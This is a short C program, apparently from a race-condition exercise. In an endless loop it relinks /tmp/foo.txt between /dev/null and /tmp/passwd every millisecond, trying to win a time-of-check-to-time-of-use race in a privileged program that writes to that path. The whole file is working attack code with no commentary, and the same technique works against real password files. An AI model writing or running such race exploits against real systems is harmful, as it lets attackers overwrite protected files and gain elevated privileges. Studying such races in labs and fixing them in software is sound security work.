#include <unistd.h>
void main() {
  while (1) {
    unlink("/tmp/foo.txt");
    symlink("/dev/null", "/tmp/foo.txt");
    usleep(1000);

    unlink("/tmp/foo.txt");
    symlink("/tmp/passwd", "/tmp/foo.txt");
    usleep(1000);
  }
}
